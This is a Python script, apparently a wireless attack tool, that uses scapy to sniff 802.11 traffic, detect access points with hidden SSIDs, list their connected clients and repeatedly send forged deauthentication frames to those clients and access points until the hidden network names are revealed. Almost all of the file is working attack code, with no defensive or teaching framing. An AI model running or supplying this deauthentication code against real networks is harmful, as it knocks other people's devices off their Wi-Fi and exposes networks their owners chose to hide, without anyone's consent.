import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeResp, Dot11Beacon, Dot11, Dot11Deauth, Dot11Elt

intfmon = 'wlan0'
channel = 2
mymac = ''
count = 5
verbose = 0

aps2get = set()  # set with BSSID of hidden AP
aps2deauth = set()
gotaps = set()  # set with BSSID of recovered hidden AP
clientdeauthlist = set()  # set with STA connected to hidden APs
ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:',
          '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mymac]


def PacketHandler(pkt):
    global aps2get, gotaps, clientdeauthlist
    if pkt.haslayer(Dot11Beacon) and not pkt.info:  # Hidden AP
        if pkt.addr3 not in aps2deauth and pkt.addr3 not in gotaps \
                and pkt.addr3 not in ignore and pkt.addr3 not in aps2get:
            aps2get.add(pkt.addr3)
            print("HiddenSSID found with BSSID: %s" % pkt.addr3)
    elif pkt.haslayer(Dot11ProbeResp) and pkt.addr3 in aps2get \
            and pkt.addr3 not in ignore and pkt.addr3 not in gotaps:
        aps2get.remove(pkt.addr3)
        gotaps.add(pkt.addr3)
        clientdeauthlist = set()
        print(f'HiddenSSID: {pkt[Dot11Elt].info.decode()} discovered for '
              f'BSSID:{pkt.addr3}')
    elif pkt.type in [1, 2] and pkt.addr3 not in gotaps and \
            pkt.addr3 not in ignore and pkt.addr3 in aps2get:
        if pkt.addr1 and pkt.addr2:  # if "from" and "to" mac addr. exists
            if pkt.addr3 == pkt.addr1:  # packet destination is AP and src is STA
                if pkt.addr2 not in clientdeauthlist and not pkt.addr2 in ignore:
                    client = (pkt.addr3, pkt.addr2)
                    clientdeauthlist.add(client)
            elif pkt.addr2 == pkt.addr3:  # packet destination is STA and src is AP
                if pkt.addr1 not in clientdeauthlist and not pkt.addr1 in ignore:
                    client = (pkt.addr3, pkt.addr1)
                    clientdeauthlist.add(client)


def deauthlist():
    global aps2get, gotaps, clientdeauthlist
    while True:
        pkts = []
        if len(clientdeauthlist) > 0:
            for x in clientdeauthlist:
                client = x[1]
                ap = x[0]
                # Append the packets to a new list, so we don't have to hog the lock
                deauth_sta = Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
                deauth_ap = Dot11(addr1=ap, addr2=client, addr3=client) / Dot11Deauth()
                pkts.append(deauth_sta)
                pkts.append(deauth_ap)
                print(f'Deauthing STA: {client} from AP:{ap}...')
        if len(pkts) > 0:
            for pkt in pkts:
                send(pkt, inter=0.100, count=count, verbose=0)
        time.sleep(10)


def SetChannel(channels):
    cmd0 = 'ifconfig %s up >/dev/null 2>&1' % intfmon
    cmd1 = 'iw dev %s set channel %s >/dev/null 2>&1' % (intfmon, channels)
    try:
        os.system(cmd0)
        os.system(cmd1)
        print("Setting %s to channel: %s" % (intfmon, channels))
    except:
        print(("Error setting channel for %s" % intfmon))


# Main loop
if type(channel) == 'int':
    channel = str(channel)
if channel:
    SetChannel(channel)
print("Looking for hidden AP in channel %s" % channel)
print("Press CTRL+C to stop execution!")

# Start deauth thread
deauth_thread = Thread(target=deauthlist)
deauth_thread.daemon = True
deauth_thread.start()

sniff(iface=intfmon, store=False, prn=PacketHandler, lfilter=lambda pkt: Dot11 in pkt)
